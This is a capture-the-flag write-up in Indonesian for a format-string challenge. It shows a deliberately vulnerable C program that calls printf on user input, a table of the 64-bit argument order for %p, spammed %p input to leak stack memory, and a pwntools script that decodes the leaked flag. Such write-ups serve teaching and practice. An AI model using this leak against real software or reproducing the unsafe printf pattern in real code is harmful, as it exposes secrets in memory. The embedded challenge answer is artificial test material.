# Format-string-1
## Probset
```
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

## Diketahui
Terdapat beberapa hal yang diketahui dan harus diketahui, yaitu:
* Di dalam main terdapat empat string yang dialokasikan, sehingga stack akan memiliki anatomi sebagai berikut:

| STACK |
| :---: |
| Return Address  |
| Saved RBP  |
| secret2[64]  |
| flag[64]  |
| secret1[64]  |
| buff[1024]  |

* Terdapat printf(buf) sehingga kita bisa eksploitasi format-string, dengan menginput %p terus menerus, adapun urutan pengambilan data sebagai berikut (64-bit)

| urutan %p | Alamat yang diambil |
| :---:     | :---:    |
| %1$p      | RSI      |
| %2$p      | RDX      |
| %3$p      | RCX      |
| %4$p      | R8       |
| %5$p      | R9       |
| %6$p      | [RSP]    |
| %7$p      | [RSP+8]  |
| %8$p      | [RSP+16] |
| %9$p      | [RSP+24] |
| %10$p     | [RSP+32] |

## Eksekusi
* Input spam %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p....... secara terus menerus, lalu rapihkan di nvim dengan command
```
$s/\./\r/g
```
* Cari hasil dengan 6F636970 (adalah hex little endian dari "pico")
* Ambil 8 baris hec (64/8=8)
```
from pwn import *

blok1 = p64(0x7b4654436f636970).decode()
blok2 = p64(0x355f31346d316e34).decode()
blok3 = p64(0x3478345f33317937).decode()
blok4 = p64(0x31395f673431665f).decode()
blok5 = p64(0x7d653464663533).decode()


print(blok1 + blok2 + blok3 + blok4 + blok5)
```